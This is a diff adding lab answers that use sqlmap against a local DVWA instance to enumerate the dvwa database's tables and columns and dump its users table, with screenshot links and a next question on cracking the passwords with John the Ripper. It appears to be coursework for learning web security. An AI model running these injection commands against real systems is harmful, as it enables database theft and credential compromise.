@@ -147,6 +147,31 @@ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="
 
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
+Get tables from a specific database:
+
+```
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=veum4ka5g5rqc8rcnghg20ch00; security=low" -D dvwa --tables
+```
+
+<img width="500" alt="Screenshot" src="https://github.com/DaronD1709/Information-Security/blob/main/Security_Lab/img/Screenshot%202024-10-21%20at%2011.12.23.png"><br>
+
+Get columns from a specific table
+
+```
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<your_session_id>; security=low" -D dvwa -T users --columns
+
+```
+
+<img width="500" alt="Screenshot" src="https://github.com/DaronD1709/Information-Security/blob/main/Security_Lab/img/Screenshot%202024-10-21%20at%2011.13.29.png"><br>
+
+Dump user information:
+
+```
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<your_session_id>; security=low" -D dvwa -T users --dump
+
+```
+
+<img width="500" alt="Screenshot" src="https://github.com/DaronD1709/Information-Security/blob/main/Security_Lab/img/Screenshot%202024-10-21%20at%2011.15.19.png"><br>
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
